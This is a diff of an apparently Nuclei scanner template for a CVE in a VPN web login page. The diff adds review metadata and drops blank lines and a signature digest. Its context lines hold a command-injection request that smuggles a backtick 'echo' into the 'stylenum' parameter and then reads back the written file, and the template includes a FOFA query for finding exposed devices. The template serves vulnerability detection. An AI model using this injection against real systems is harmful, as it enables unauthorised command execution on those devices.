@@ -11,6 +11,7 @@ info:
   reference:
     - https://github.com/koishi0x01/CVE/blob/main/CVE_1.md
   metadata:
+    runzero-review: REJECT/2025-11-07/excluding tag intrusive
     verified: true
     max-request: 2
     fofa-query: '"<TITLE>Web user login</TITLE>" && "<META content\==MSHTML 6.00.2900.5583\" name\=GENERATOR></HEAD>"'
@@ -19,7 +20,6 @@ info:
 variables:
   string: "{{randstr}}"
   filename: "{{to_lower(rand_text_alpha(5))}}"
-
 flow: http(1) && http(2)
 
 http:
@@ -41,7 +41,6 @@ http:
       - |
         GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+%27{{string}}%27%3E/www/tmp/{{filename}}.txt%60 HTTP/1.1
         Host: {{Hostname}}
-
       - |
         GET /tmp/{{filename}}.txt HTTP/1.1
         Host: {{Hostname}}
@@ -53,4 +52,4 @@ http:
           - 'contains(content_type_2, "text/plain")'
           - "contains(body_2, '{{string}}')"
         condition: and
-# digest: 4b0a00483046022100ae7ce53eb008a7352e22a70a3c2f656173357db9d5d2cca142c3f97503b0f397022100a9484f06c2d63054f0432dc3d3a9bb20bae89bc9e315624c9ba12af6f97c1e2e:922c64590222798bb761d5b6d8e72950
+
